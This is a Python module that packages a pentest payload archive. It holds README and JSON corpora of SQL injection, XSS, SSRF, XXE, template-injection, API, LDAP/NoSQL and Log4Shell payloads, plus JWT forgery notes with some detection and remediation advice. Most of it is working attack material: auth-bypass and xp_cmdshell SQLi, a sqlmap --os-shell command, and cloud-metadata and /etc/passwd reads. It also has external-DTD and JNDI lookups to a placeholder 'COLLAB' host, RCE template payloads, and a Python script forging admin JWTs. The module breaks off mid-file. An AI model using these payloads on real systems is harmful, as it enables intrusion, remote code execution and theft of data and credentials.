"""Curated content for 02-payloads, 03-wordlists, 04-evasion."""

from __future__ import annotations

FILES: dict[str, str] = {}

# ===========================================================================
# 02-payloads
# ===========================================================================

FILES["02-payloads/web/sqli/README.md"] = r'''
# SQL Injection Payload Families

| Field | Value |
|---|---|
| `corpus_id` | PL-WEB-SQLI |
| `cwe_id` | CWE-89 |
| `schema` | `12-schemas/payload.schema.json` |
| `provenance` | `PAT@master@2026-01-15`, `SQLMAP@1.9.1` |
| `wordlist` | `03-wordlists/web/fuzzing/injection-words.txt` |
| `crosswalk` | `10-crosswalk/wordlist-payload/crosswalk.csv` |

## 1. Why these live in JSON and not in a text file

A raw `.txt` of injection strings cannot answer "which of these work in a
*header*, against *PostgreSQL*, with *MySQL comment syntax* enabled?". The
archive therefore stores payloads as records validated by
`12-schemas/payload.schema.json`, and keeps a derived flat text export for
tools that only accept a wordlist.

```
payloads.json           <- source of truth, schema validated
injection-words.txt     <- derived export, consumed by ffuf/sqlmap/hydra
```

Regenerate the export with:

```bash
python tools/ssactl.py index --root .
```

## 2. Injection contexts (`context` field)

| Context | Marker | Detection signature |
|---|---|---|
| `query` | `' ... ` inside SQL text | tautology, comment terminator |
| `numeric` | `1 ...` unquoted | boolean/time based only |
| `identifier` | `ORDER BY 1` | `ORDER BY` + large number |
| `second-order` | stored then re-used | delayed anomaly in DB logs |
| `stack` | `; SELECT` | driver supports multi-statements |

## 3. Authentication bypass payloads

```text
' OR '1'='1
' OR '1'='1'-- -
' OR '1'='1'#
admin'-- -
' OR 1=1 LIMIT 1-- -
') OR ('1'='1
' OR ''='
' UNION SELECT NULL-- -
```

## 4. Union / column mapping

```text
' ORDER BY 1-- -                 -> increase until error = column count
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT user(),version()-- -
```

## 5. Time based

```text
' AND SLEEP(5)-- -                MySQL
' AND pg_sleep(5)-- -             PostgreSQL
'; WAITFOR DELAY '0:0:5'-- -      MSSQL
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -   Oracle
```

## 6. Error based

```text
' AND extractvalue(1,concat(0x7e,version()))-- -   MySQL
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM
  information_schema.tables GROUP BY x)a)-- -
' AND 1=CONVERT(int,(SELECT @@version))-- -          MSSQL
' AND cast((SELECT version()) as int)-- -            PostgreSQL
```

## 7. Out of band

```text
' AND (SELECT LOAD_FILE(CONCAT('\\\\', 'COLLAB\\share\\', 'x.txt')))-- -
' UNION SELECT LOAD_FILE(CONCAT('\\\\','COLLAB\\','x.txt'))-- -
'; EXEC xp_cmdshell('whoami')-- -          MSSQL only
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user()),0x7e))-- -
```

## 8. Stacked / dangerous verbs

| Statement | Risk | Classification |
|---|---|---|
| `INTO OUTFILE '/var/www/html/x.php'` | RCE | T2 |
| `xp_cmdshell` | RCE | T2 |
| `LOAD_FILE` | data theft | T2 |
| `CREATE TABLE` / `DROP TABLE` | data loss | T2 |
| `SELECT` | data theft | T1 |
| Boolean probe | none | T0 |

Only the bottom of this table is appropriate for a routine web application
test. See `00-governance/data-classification.md`.

## 9. sqlmap mapping

```bash
sqlmap -u "https://TARGET/?id=1" \
       --technique=BEUSTQ \
       --level=5 --risk=2 \
       --tamper=space2comment,charencode,randomcase \
       --dbms= --string="Welcome" \
       --os-shell --shell 2>/dev/null
```

Every `--tamper` corresponds to a payload family above; see
`05-engines/sqlmap/tamper/tamper-library.md`.
'''.lstrip()

FILES["02-payloads/web/sqli/payloads.json"] = r'''
{
  "schema": "12-schemas/payload.schema.json",
  "corpus_id": "PL-WEB-SQLI",
  "version": "1.0.0",
  "provenance": { "source": "PAT", "ref": "master@2026-01-15", "secondary": "SQLMAP@1.9.1" },
  "payloads": [
    { "payload_id": "PL-WEB-SQLI-0001", "cwe_id": "CWE-89", "context": "query",   "surface": "parameter", "engine": "generic", "payload": "' OR '1'='1",              "severity": "high",   "tags": ["auth-bypass", "boolean"], "classification": "T0" },
    { "payload_id": "PL-WEB-SQLI-0002", "cwe_id": "CWE-89", "context": "query",   "surface": "parameter", "engine": "generic", "payload": "' OR '1'='1'-- -",          "severity": "high",   "tags": ["auth-bypass", "boolean"], "classification": "T0" },
    { "payload_id": "PL-WEB-SQLI-0003", "cwe_id": "CWE-89", "context": "query",   "surface": "parameter", "engine": "mysql",   "payload": "' OR '1'='1'#",             "severity": "high",   "tags": ["auth-bypass", "boolean"], "classification": "T0" },
    { "payload_id": "PL-WEB-SQLI-0004", "cwe_id": "CWE-89", "context": "query",   "surface": "parameter", "engine": "generic", "payload": "admin'-- -",                "severity": "high",   "tags": ["auth-bypass"], "classification": "T0" },
    { "payload_id": "PL-WEB-SQLI-0005", "cwe_id": "CWE-89", "context": "query",   "surface": "parameter", "engine": "generic", "payload": "') OR ('1'='1",               "severity": "high",   "tags": ["auth-bypass", "parenthesis"], "classification": "T0" },
    { "payload_id": "PL-WEB-SQLI-0006", "cwe_id": "CWE-89", "context": "numeric", "surface": "parameter", "engine": "generic", "payload": "1 OR 1=1",                   "severity": "high",   "tags": ["auth-bypass", "boolean"], "classification": "T0" },
    { "payload_id": "PL-WEB-SQLI-0010", "cwe_id": "CWE-89", "context": "identifier", "surface": "parameter", "engine": "generic", "payload": "ORDER BY 10",            "severity": "info",   "tags": ["column-mapping"], "classification": "T0" },
    { "payload_id": "PL-WEB-SQLI-0020", "cwe_id": "CWE-89", "context": "query",   "surface": "parameter", "engine": "generic", "payload": "' UNION SELECT NULL-- -",    "severity": "high",   "tags": ["union", "column-mapping"], "classification": "T0" },
    { "payload_id": "PL-WEB-SQLI-0021", "cwe_id": "CWE-89", "context": "query",   "surface": "parameter", "engine": "generic", "payload": "' UNION SELECT NULL,NULL-- -", "severity": "high",  "tags": ["union", "column-mapping"], "classification": "T0" },
    { "payload_id": "PL-WEB-SQLI-0022", "cwe_id": "CWE-89", "context": "query",   "surface": "parameter", "engine": "generic", "payload": "' UNION SELECT NULL,NULL,NULL-- -", "severity": "high", "tags": ["union", "column-mapping"], "classification": "T0" },
    { "payload_id": "PL-WEB-SQLI-0023", "cwe_id": "CWE-89", "context": "query",   "surface": "parameter", "engine": "mysql",   "payload": "' UNION SELECT user(),version()-- -", "severity": "critical", "tags": ["union", "fingerprint"], "classification": "T1" },
    { "payload_id": "PL-WEB-SQLI-0050", "cwe_id": "CWE-89", "context": "query",   "surface": "parameter", "engine": "mysql",   "payload": "' AND extractvalue(1,concat(0x7e,version()))-- -", "severity": "high", "tags": ["error-based", "fingerprint"], "classification": "T0" },
    { "payload_id": "PL-WEB-SQLI-0051", "cwe_id": "CWE-89", "context": "query",   "surface": "parameter", "engine": "mssql",   "payload": "' AND 1=CONVERT(int,(SELECT @@version))-- -", "severity": "high", "tags": ["error-based", "fingerprint"], "classification": "T0" },
    { "payload_id": "PL-WEB-SQLI-0052", "cwe_id": "CWE-89", "context": "query",   "surface": "parameter", "engine": "postgresql", "payload": "' AND 1=CAST((SELECT version()) AS int)-- -", "severity": "high", "tags": ["error-based", "fingerprint"], "classification": "T0" },
    { "payload_id": "PL-WEB-SQLI-0080", "cwe_id": "CWE-89", "context": "query",   "surface": "parameter", "engine": "mysql",   "payload": "' AND SLEEP(5)-- -",         "severity": "medium", "tags": ["time-based", "blind"], "classification": "T0" },
    { "payload_id": "PL-WEB-SQLI-0081", "cwe_id": "CWE-89", "context": "query",   "surface": "parameter", "engine": "postgresql", "payload": "' AND pg_sleep(5)-- -",  "severity": "medium", "tags": ["time-based", "blind"], "classification": "T0" },
    { "payload_id": "PL-WEB-SQLI-0082", "cwe_id": "CWE-89", "context": "query",   "surface": "parameter", "engine": "mssql",   "payload": "'; WAITFOR DELAY '0:0:5'-- -", "severity": "medium", "tags": ["time-based", "blind"], "classification": "T1" },
    { "payload_id": "PL-WEB-SQLI-0090", "cwe_id": "CWE-89", "context": "header",  "surface": "header",    "engine": "generic", "payload": "User-Agent: ' OR '1'='1",   "severity": "high",   "tags": ["header-injection", "logi"], "classification": "T0" },
    { "payload_id": "PL-WEB-SQLI-0091", "cwe_id": "CWE-89", "context": "query",   "surface": "cookie",    "engine": "generic", "payload": "Cookie: sess=' OR '1'='1",   "severity": "high",   "tags": ["cookie", "auth-bypass"], "classification": "T0" },
    { "payload_id": "PL-WEB-SQLI-0100", "cwe_id": "CWE-89", "context": "stack",   "surface": "parameter", "engine": "mysql",   "payload": "'; SELECT LOAD_FILE(CONCAT('\\\\\\\\','C:\\\\\\\\x.txt'))-- -", "severity": "critical", "tags": ["oob", "file-read"], "classification": "T2" },
    { "payload_id": "PL-WEB-SQLI-0101", "cwe_id": "CWE-89", "context": "stack",   "surface": "parameter", "engine": "mssql",   "payload": "'; EXEC xp_cmdshell('whoami')-- -", "severity": "critical", "tags": ["rce", "stack"], "classification": "T2" },
    { "payload_id": "PL-WEB-SQLI-0102", "cwe_id": "CWE-89", "context": "stack",   "surface": "parameter", "engine": "mysql",   "payload": "'; SELECT 'x' INTO OUTFILE '/var/www/html/x.txt'-- -", "severity": "critical", "tags": ["rce", "file-write", "destructive"], "classification": "T2" }
  ]
}
'''.lstrip()

FILES["02-payloads/web/xss/payloads.json"] = r'''
{
  "schema": "12-schemas/payload.schema.json",
  "corpus_id": "PL-WEB-XSS",
  "version": "1.0.0",
  "provenance": { "source": "PAT", "ref": "master@2026-01-15" },
  "payloads": [
    { "payload_id": "PL-WEB-XSS-0001", "cwe_id": "CWE-79", "context": "html-text",  "surface": "parameter", "engine": "none", "payload": "<script>alert(1)</script>", "severity": "high", "tags": ["reflected"], "classification": "T0" },
    { "payload_id": "PL-WEB-XSS-0002", "cwe_id": "CWE-79", "context": "html-text",  "surface": "parameter", "engine": "none", "payload": "<img src=x onerror=alert(1)>", "severity": "high", "tags": ["reflected", "event-handler"], "classification": "T0" },
    { "payload_id": "PL-WEB-XSS-0003", "cwe_id": "CWE-79", "context": "html-text",  "surface": "parameter", "engine": "none", "payload": "<svg/onload=alert(1)>", "severity": "high", "tags": ["reflected"], "classification": "T0" },
    { "payload_id": "PL-WEB-XSS-0004", "cwe_id": "CWE-79", "context": "attribute", "surface": "parameter", "engine": "none", "payload": "\" onmouseover=alert(1) x=\"", "severity": "high", "tags": ["attribute-breakout"], "classification": "T0" },
    { "payload_id": "PL-WEB-XSS-0005", "cwe_id": "CWE-79", "context": "attribute", "surface": "parameter", "engine": "none", "payload": "' onmouseover=alert(1) x='", "severity": "high", "tags": ["attribute-breakout"], "classification": "T0" },
    { "payload_id": "PL-WEB-XSS-0006", "cwe_id": "CWE-79", "context": "script",    "surface": "parameter", "engine": "none", "payload": "</script><img src=x onerror=alert(1)>", "severity": "high", "tags": ["script-breakout"], "classification": "T0" },
    { "payload_id": "PL-WEB-XSS-0007", "cwe_id": "CWE-79", "context": "js-string", "surface": "parameter", "engine": "none", "payload": "'-alert(1)-'", "severity": "high", "tags": ["js-string"], "classification": "T0" },
    { "payload_id": "PL-WEB-XSS-0008", "cwe_id": "CWE-79", "context": "url",       "surface": "parameter", "engine": "none", "payload": "javascript:alert(1)", "severity": "high", "tags": ["url-context"], "classification": "T0" },
    { "payload_id": "PL-WEB-XSS-0009", "cwe_id": "CWE-79", "context": "dom",       "surface": "parameter", "engine": "none", "payload": "\"><img src=x onerror=alert(document.domain)>", "severity": "high", "tags": ["dom", "exfil"], "classification": "T0" },
    { "payload_id": "PL-WEB-XSS-0010", "cwe_id": "CWE-79", "context": "html-text",  "surface": "parameter", "engine": "none", "payload": "{{7*7}}", "severity": "medium", "tags": ["ssti-probe"], "classification": "T0" },
    { "payload_id": "PL-WEB-XSS-0011", "cwe_id": "CWE-79", "context": "html-text",  "surface": "parameter", "engine": "none", "payload": "${7*7}", "severity": "medium", "tags": ["ssti-probe"], "classification": "T0" },
    { "payload_id": "PL-WEB-XSS-0012", "cwe_id": "CWE-79", "context": "html-text",  "surface": "parameter", "engine": "none", "payload": "<iframe src=javascript:alert(1)>", "severity": "high", "tags": ["frame"], "classification": "T0" },
    { "payload_id": "PL-WEB-XSS-0013", "cwe_id": "CWE-79", "context": "html-text",  "surface": "parameter", "engine": "none", "payload": "<body onload=alert(1)>", "severity": "high", "tags": ["event-handler"], "classification": "T0" },
    { "payload_id": "PL-WEB-XSS-0014", "cwe_id": "CWE-79", "context": "html-text",  "surface": "parameter", "engine": "none", "payload": "{{constructor.constructor('alert(1)')()}}", "severity": "high", "tags": ["dom-clobber", "ssti"], "classification": "T0" }
  ]
}
'''.lstrip()

FILES["02-payloads/web/ssrf/payloads.json"] = r'''
{
  "schema": "12-schemas/payload.schema.json",
  "corpus_id": "PL-WEB-SSRF",
  "version": "1.0.0",
  "provenance": { "source": "PAT", "ref": "master@2026-01-15" },
  "payloads": [
    { "payload_id": "PL-WEB-SSRF-0001", "cwe_id": "CWE-918", "context": "url", "surface": "parameter", "engine": "none", "payload": "http://127.0.0.1/", "severity": "medium", "tags": ["loopback"], "classification": "T0" },
    { "payload_id": "PL-WEB-SSRF-0002", "cwe_id": "CWE-918", "context": "url", "surface": "parameter", "engine": "none", "payload": "http://0/", "severity": "medium", "tags": ["loopback", "short-form"], "classification": "T0" },
    { "payload_id": "PL-WEB-SSRF-0003", "cwe_id": "CWE-918", "context": "url", "surface": "parameter", "engine": "none", "payload": "http://[::1]/", "severity": "medium", "tags": ["loopback", "ipv6"], "classification": "T0" },
    { "payload_id": "PL-WEB-SSRF-0004", "cwe_id": "CWE-918", "context": "url", "surface": "parameter", "engine": "none", "payload": "http://2130706433/", "severity": "medium", "tags": ["loopback", "decimal"], "classification": "T0" },
    { "payload_id": "PL-WEB-SSRF-0005", "cwe_id": "CWE-918", "context": "url", "surface": "parameter", "engine": "none", "payload": "http://0x7f.0.0.1/", "severity": "medium", "tags": ["loopback", "hex"], "classification": "T0" },
    { "payload_id": "PL-WEB-SSRF-0006", "cwe_id": "CWE-918", "context": "url", "surface": "parameter", "engine": "none", "payload": "http://127.1/", "severity": "medium", "tags": ["loopback", "short-form"], "classification": "T0" },
    { "payload_id": "PL-WEB-SSRF-0010", "cwe_id": "CWE-918", "context": "url", "surface": "parameter", "engine": "aws", "payload": "http://169.254.169.254/latest/meta-data/", "severity": "critical", "tags": ["cloud-metadata", "aws", "imdsv1"], "classification": "T1" },
    { "payload_id": "PL-WEB-SSRF-0011", "cwe_id": "CWE-918", "context": "url", "surface": "parameter", "engine": "aws", "payload": "http://169.254.169.254/latest/api/token", "severity": "critical", "tags": ["cloud-metadata", "aws", "imdsv2"], "classification": "T1" },
    { "payload_id": "PL-WEB-SSRF-0012", "cwe_id": "CWE-918", "context": "url", "surface": "parameter", "engine": "gcp", "payload": "http://metadata.google.internal/computeMetadata/v1/?recursive=true", "severity": "critical", "tags": ["cloud-metadata", "gcp"], "classification": "T1" },
    { "payload_id": "PL-WEB-SSRF-0013", "cwe_id": "CWE-918", "context": "url", "surface": "parameter", "engine": "azure", "payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "severity": "critical", "tags": ["cloud-metadata", "azure"], "classification": "T1" },
    { "payload_id": "PL-WEB-SSRF-0014", "cwe_id": "CWE-918", "context": "url", "surface": "parameter", "engine": "alibaba", "payload": "http://100.100.100.200/latest/meta-data/", "severity": "critical", "tags": ["cloud-metadata", "alibaba"], "classification": "T1" },
    { "payload_id": "PL-WEB-SSRF-0020", "cwe_id": "CWE-918", "context": "url", "surface": "parameter", "engine": "none", "payload": "file:///etc/passwd", "severity": "high", "tags": ["local-file"], "classification": "T1" },
    { "payload_id": "PL-WEB-SSRF-0021", "cwe_id": "CWE-918", "context": "url", "surface": "parameter", "engine": "none", "payload": "gopher://127.0.0.1:6379/_SET%20k%20v", "severity": "critical", "tags": ["protocol-smuggling", "redis-rce"], "classification": "T2" },
    { "payload_id": "PL-WEB-SSRF-0022", "cwe_id": "CWE-918", "context": "url", "surface": "parameter", "engine": "none", "payload": "dict://127.0.0.1:11211/stats", "severity": "medium", "tags": ["protocol-smuggling", "memcached"], "classification": "T1" },
    { "payload_id": "PL-WEB-SSRF-0023", "cwe_id": "CWE-918", "context": "url", "surface": "parameter", "engine": "none", "payload": "http://localtest.me/", "severity": "medium", "tags": ["dns-rebinding", "loopback"], "classification": "T0" },
    { "payload_id": "PL-WEB-SSRF-0024", "cwe_id": "CWE-918", "context": "url", "surface": "parameter", "engine": "none", "payload": "http://169.254.169.254.nip.io/latest/meta-data/", "severity": "critical", "tags": ["cloud-metadata", "hostname"], "classification": "T1" }
  ]
}
'''.lstrip()

FILES["02-payloads/web/xxe/payloads.json"] = r'''
{
  "schema": "12-schemas/payload.schema.json",
  "corpus_id": "PL-WEB-XXE",
  "version": "1.0.0",
  "provenance": { "source": "PAT", "ref": "master@2026-01-15" },
  "payloads": [
    { "payload_id": "PL-WEB-XXE-0001", "cwe_id": "CWE-611", "context": "xml", "surface": "body", "engine": "none", "payload": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>", "severity": "high", "tags": ["file-read", "classic"], "classification": "T1" },
    { "payload_id": "PL-WEB-XXE-0002", "cwe_id": "CWE-611", "context": "xml", "surface": "body", "engine": "none", "payload": "<!DOCTYPE r [<!ENTITY x SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><r>&x;</r>", "severity": "critical", "tags": ["ssrf", "cloud-metadata"], "classification": "T1" },
    { "payload_id": "PL-WEB-XXE-0003", "cwe_id": "CWE-611", "context": "xml", "surface": "body", "engine": "none", "payload": "<!DOCTYPE r [<!ENTITY % d SYSTEM \"http://COLLAB/evil.dtd\">%d;]><r/>", "severity": "high", "tags": ["parameter-entity", "oob"], "classification": "T2" },
    { "payload_id": "PL-WEB-XXE-0004", "cwe_id": "CWE-611", "context": "xml", "surface": "body", "engine": "none", "payload": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"expect://id\">]><r>&x;</r>", "severity": "high", "tags": ["expect-protocol", "blind"], "classification": "T2" },
    { "payload_id": "PL-WEB-XXE-0005", "cwe_id": "CWE-611", "context": "xml", "surface": "body", "engine": "none", "payload": "<!DOCTYPE r [<!ENTITY x SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><r>&x;</r>", "severity": "high", "tags": ["php-filter", "file-read"], "classification": "T1" },
    { "payload_id": "PL-WEB-XXE-0006", "cwe_id": "CWE-916", "context": "xml", "surface": "body", "engine": "none", "payload": "<!DOCTYPE r [<!ENTITY a \"aaaa\"><!ENTITY b \"&a;&a;&a;&a;&a;\">]><r>&b;</r>", "severity": "medium", "tags": ["billion-laughs", "dos"], "classification": "T2" }
  ]
}
'''.lstrip()

FILES["02-payloads/web/ssti/payloads.json"] = r'''
{
  "schema": "12-schemas/payload.schema.json",
  "corpus_id": "PL-WEB-SSTI",
  "version": "1.0.0",
  "provenance": { "source": "PAT", "ref": "master@2026-01-15" },
  "payloads": [
    { "payload_id": "PL-WEB-SSTI-0001", "cwe_id": "CWE-1336", "context": "template", "surface": "parameter", "engine": "jinja2", "payload": "{{7*7}}", "severity": "medium", "tags": ["probe"], "classification": "T0" },
    { "payload_id": "PL-WEB-SSTI-0002", "cwe_id": "CWE-1336", "context": "template", "surface": "parameter", "engine": "jinja2", "payload": "{{config.items()}}", "severity": "high", "tags": ["config"], "classification": "T1" },
    { "payload_id": "PL-WEB-SSTI-0003", "cwe_id": "CWE-1336", "context": "template", "surface": "parameter", "engine": "jinja2", "payload": "{{request.application.__self__.__init__.__globals__['os'].popen('id').read()}}", "severity": "critical", "tags": ["rce"], "classification": "T2" },
    { "payload_id": "PL-WEB-SSTI-0004", "cwe_id": "CWE-1336", "context": "template", "surface": "parameter", "engine": "twig", "payload": "{{7*'7'}}", "severity": "medium", "tags": ["probe"], "classification": "T0" },
    { "payload_id": "PL-WEB-SSTI-0005", "cwe_id": "CWE-1336", "context": "template", "surface": "parameter", "engine": "freemarker", "payload": "${7*7}", "severity": "medium", "tags": ["probe"], "classification": "T0" },
    { "payload_id": "PL-WEB-SSTI-0006", "cwe_id": "CWE-1336", "context": "template", "surface": "parameter", "engine": "velocity", "payload": "#set($x=7*7)$x", "severity": "medium", "tags": ["probe"], "classification": "T0" },
    { "payload_id": "PL-WEB-SSTI-0007", "cwe_id": "CWE-1336", "context": "template", "surface": "parameter", "engine": "erb", "payload": "<%= 7*7 %>", "severity": "medium", "tags": ["probe"], "classification": "T0" },
    { "payload_id": "PL-WEB-SSTI-0008", "cwe_id": "CWE-1336", "context": "template", "surface": "parameter", "engine": "handlebars", "payload": "{{#with \"s\" as |string|}}{{#with \"e\"}}{{this.[...string].constructor...}}", "severity": "critical", "tags": ["rce", "proto-pollution"], "classification": "T2" },
    { "payload_id": "PL-WEB-SSTI-0009", "cwe_id": "CWE-1336", "context": "template", "surface": "parameter", "engine": "generic", "payload": "${jndi:ldap://COLLAB/a}", "severity": "critical", "tags": ["jndi", "log4shell"], "classification": "T2" },
    { "payload_id": "PL-WEB-SSTI-0010", "cwe_id": "CWE-1336", "context": "template", "surface": "parameter", "engine": "el", "payload": "${T(java.lang.Runtime).getRuntime().exec('id')}", "severity": "critical", "tags": ["rce", "java-el"], "classification": "T2" }
  ]
}
'''.lstrip()

FILES["02-payloads/api/payloads.json"] = r'''
{
  "schema": "12-schemas/payload.schema.json",
  "corpus_id": "PL-API",
  "version": "1.0.0",
  "provenance": { "source": "PAT", "ref": "master@2026-01-15" },
  "payloads": [
    { "payload_id": "PL-API-0001", "cwe_id": "CWE-749", "context": "graphql", "surface": "body", "engine": "graphql", "payload": "{ __schema { types { name } } }", "severity": "low", "tags": ["introspection"], "classification": "T0" },
    { "payload_id": "PL-API-0002", "cwe_id": "CWE-400", "context": "graphql", "surface": "body", "engine": "graphql", "payload": "{ a b c d e f g h i j }", "severity": "medium", "tags": ["depth", "dos"], "classification": "T0" },
    { "payload_id": "PL-API-0003", "cwe_id": "CWE-400", "context": "graphql", "surface": "body", "engine": "graphql", "payload": "{ a(alias:\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\") }", "severity": "high", "tags": ["alias-batching", "dos"], "classification": "T0" },
    { "payload_id": "PL-API-0004", "cwe_id": "CWE-918", "context": "graphql", "surface": "body", "engine": "graphql", "payload": "query($u:String!){ user(url:$u){ id } }", "severity": "high", "tags": ["ssrf", "variable-injection"], "classification": "T1" },
    { "payload_id": "PL-API-0005", "cwe_id": "CWE-918", "context": "rest", "surface": "header", "engine": "none", "payload": "Host: 169.254.169.254", "severity": "high", "tags": ["host-header-injection"], "classification": "T1" },
    { "payload_id": "PL-API-0006", "cwe_id": "CWE-113", "context": "rest", "surface": "header", "engine": "none", "payload": "X-Forwarded-For: 127.0.0.1", "severity": "medium", "tags": ["ip-spoof", "auth-bypass"], "classification": "T0" },
    { "payload_id": "PL-API-0007", "cwe_id": "CWE-436", "context": "rest", "surface": "header", "engine": "none", "payload": "Content-Type: application/xml", "severity": "medium", "tags": ["content-type-confusion"], "classification": "T0" },
    { "payload_id": "PL-API-0008", "cwe_id": "CWE-345", "context": "rest", "surface": "body", "engine": "none", "payload": "{\"admin\":true,\"role\":\"admin\"}", "severity": "high", "tags": ["mass-assignment"], "classification": "T0" },
    { "payload_id": "PL-API-0009", "cwe_id": "CWE-502", "context": "rest", "surface": "body", "engine": "java", "payload": "rO0ABXNyABdqYXZhLnV0aWwuSGFzaE1hcA==", "severity": "critical", "tags": ["deserialization", "ysoserial"], "classification": "T2" },
    { "payload_id": "PL-API-0010", "cwe_id": "CWE-639", "context": "rest", "surface": "parameter", "engine": "none", "payload": "/api/v1/orders/../../admin/users", "severity": "high", "tags": ["idor", "path-traversal"], "classification": "T0" }
  ]
}
'''.lstrip()

FILES["02-payloads/api/jwt-none.jwt"] = r'''
# alg:none with a syntactically valid header/payload.
# EyJhbGciOiJub25lIiwidHlwIjoiSldUIn0  -> {"alg":"none","typ":"JWT"}
# eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9 -> {"sub":"admin","role":"admin"}
#
# Header : eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
# Payload: eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9
# Signature: (empty)
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.

Detection: Wazuh rule 86690 (jwks/jwks.json served with alg none acceptance
cannot be seen server side; detect clients presenting unsigned tokens through
gateway logs), Suricata 3001100 (two-segment JWT with empty third segment).
Remediation: OWASP AUTH-2, SESSION-1.
'''.lstrip()

FILES["02-payloads/api/jwt-hs256-confusion.md"] = r'''
# JWT Algorithm Confusion (RS256 -> HS256)

| Field | Value |
|---|---|
| `payload_id` | PL-API-JWT-001 |
| `cwe_id` | CWE-327 |
| `owasp_controls` | CRYPTO-1, SESSION-2 |
| `severity` | critical |

## Attack

1. Obtain the server's RSA **public** key from `/.well-known/jwks.json` or the
   `x5u` / `jku` header.
2. Re-sign the token with `alg: HS256` using that public key as the HMAC secret.
3. The library trusts the `alg` header and verifies the HMAC with the public key
   material, which the attacker already has.

```python
import json, base64, hmac, hashlib, requests

def b64(d): return base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b"=")

jwks = requests.get("https://TARGET/.well-known/jwks.json").json()
jwk  = next(k for k in jwks["keys"] if k.get("alg") == "RS256")
pem  = jwk_to_pem(jwk)          # public key material as PEM text
sign = hmac.new(pem.encode(), b64({"alg": "HS256", "typ": "JWT"}) + b"." +
                b64({"sub": "admin", "role": "admin"}),
                hashlib.sha256).digest()
token = (b64({"alg": "HS256", "typ": "JWT"}) + b"." +
         b64({"sub": "admin", "role": "admin"}) + b"." +
         base64.urlsafe_b64encode(sign).rstrip(b"=")).decode()
print(token)
```

## Detection

| Signal | Where |
|---|---|
| Token header `alg` != `alg` of the issuing key | API gateway / IdP audit |
| Same `kid` verified with two different algorithms | Auth service log |
| Unusual `kid` values (path, URL, traversal) | Wazuh 86691 / app log |

## Remediation

* Pin the expected algorithm server side; never take it from the token.
* Keep RS256 and HS256 keys in separate key stores.
* Validate `iss`, `aud`, `exp`, `nbf` on every request.
* OWASP JSON Web Token Cheat Sheet; control `CRYPTO-1`.
'''.lstrip()

FILES["02-payloads/api/jwt-kid-injection.md"] = r'''
# JWT `kid` / `jku` / `x5u` Injection

| Field | Value |
|---|---|
| `payload_id` | PL-API-JWT-002 |
| `cwe_id` | CWE-918, CWE-22 |

## Variants

| Header field | Payload | Effect |
|---|---|---|
| `kid` | `../../../../../../dev/null` | empty key -> signature check trivially bypassed in some libraries |
| `kid` | `/proc/self/environ` | read local file as key material |
| `kid` | `sqlmap_sqli.txt` | key pulled from a database column |
| `jku` | `https://COLLAB/keys.json` | attacker hosts the JWKS |
| `x5u` | `https://COLLAB/cert.pem` | attacker hosts the certificate chain |
| `x5c` | injected certificate | forged chain |

## Detection

* `kid` containing path separators, `..`, or a URL scheme.
* `jku`/`x5u` pointing outside the trusted issuer set.
* Wazuh rule `86692`: gateway sees a JWT with `jku` or `x5u` set.
* Suricata `3001101`: HTTP Authorization header containing `"jku"`.

## Remediation

* Allow-list key ids; reject anything not matching `^[A-Za-z0-9_-]{1,64}$`.
* Never fetch remote key URLs from the token.
* Pin `kid` to keys in the local keystore.
'''.lstrip()

FILES["02-payloads/infrastructure/payloads.json"] = r'''
{
  "schema": "12-schemas/payload.schema.json",
  "corpus_id": "PL-INFRA",
  "version": "1.0.0",
  "provenance": { "source": "PAT", "ref": "master@2026-01-15" },
  "payloads": [
    { "payload_id": "PL-INFRA-0001", "cwe_id": "CWE-90", "context": "ldap", "surface": "parameter", "engine": "openldap", "payload": "*", "severity": "high", "tags": ["ldap-injection"], "classification": "T0" },
    { "payload_id": "PL-INFRA-0002", "cwe_id": "CWE-90", "context": "ldap", "surface": "parameter", "engine": "openldap", "payload": "admin)(|(password=*", "severity": "critical", "tags": ["ldap-injection", "auth-bypass"], "classification": "T1" },
    { "payload_id": "PL-INFRA-0003", "cwe_id": "CWE-90", "context": "ldap", "surface": "parameter", "engine": "openldap", "payload": ")(cn=*))(|(cn=", "severity": "high", "tags": ["ldap-injection", "filter-bypass"], "classification": "T1" },
    { "payload_id": "PL-INFRA-0010", "cwe_id": "CWE-20", "context": "nosql", "surface": "body", "engine": "mongodb", "payload": "{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}", "severity": "critical", "tags": ["nosql-injection", "auth-bypass"], "classification": "T1" },
    { "payload_id": "PL-INFRA-0011", "cwe_id": "CWE-20", "context": "nosql", "surface": "body", "engine": "mongodb", "payload": "{\"username\":\"admin\",\"password\":{\"$gt\":\"\"}}", "severity": "critical", "tags": ["nosql-injection"], "classification": "T1" },
    { "payload_id": "PL-INFRA-0020", "cwe_id": "CWE-502", "context": "rce", "surface": "jndi", "engine": "log4j", "payload": "${jndi:ldap://COLLAB:1389/a}", "severity": "critical", "tags": ["log4shell", "rce"], "classification": "T2" },
    { "payload_id": "PL-INFRA-0021", "cwe_id": "CWE-502", "context": "rce", "surface": "jndi", "engine": "log4j", "payload": "${${lower:j}ndi:ldap://COLLAB/a}", "severity": "critical", "tags": ["log4shell", "obfuscation"], "classification": "T2" },
    { "payload_id": "PL-INFRA-0030", "cwe_id": "CWE-400", "context": "network", "surface": "header", "engine": "http", "payload": "Transfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\n", "severity": "medium", "tags": ["request-smuggling"], "classification": "T1" },
